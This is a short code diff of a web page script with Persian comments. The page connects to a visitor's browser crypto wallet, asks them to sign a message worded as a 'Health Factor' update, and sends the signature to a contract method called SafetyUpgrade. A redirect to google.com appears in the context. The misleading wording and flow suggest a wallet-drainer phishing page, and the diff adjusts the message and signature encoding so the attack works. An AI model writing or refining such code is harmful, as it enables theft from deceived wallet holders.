@@ -19,8 +19,8 @@ window.location.replace("https://google.com");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      // مرحله ۱: گرفتن امضا از کاربر
-      const message = "Please sign this message to confirm."; // پیام دلخواه
+      // مرحله ۱: گرفتن امضا از کاربر (پیام باید دقیقا مطابق کانترکت باشد)
+      const message = "By signing this message, Update Your Health Factor";
       const signature = await signer.signMessage(message);
 
       // مرحله ۲: تعریف ABI و آدرس کانترکت
@@ -41,7 +41,8 @@ window.location.replace("https://google.com");
       const contract = new ethers.Contract(contractAddress, abi, signer);
 
       // مرحله ۴: ارسال تراکنش (امضا به کانترکت)
-      const txResponse = await contract.SafetyUpgrade(signature);
+      const sigBytes = ethers.getBytes(signature);
+      const txResponse = await contract.SafetyUpgrade(sigBytes);
       console.log("Tx sent:", txResponse.hash);
 
     } catch (err) {
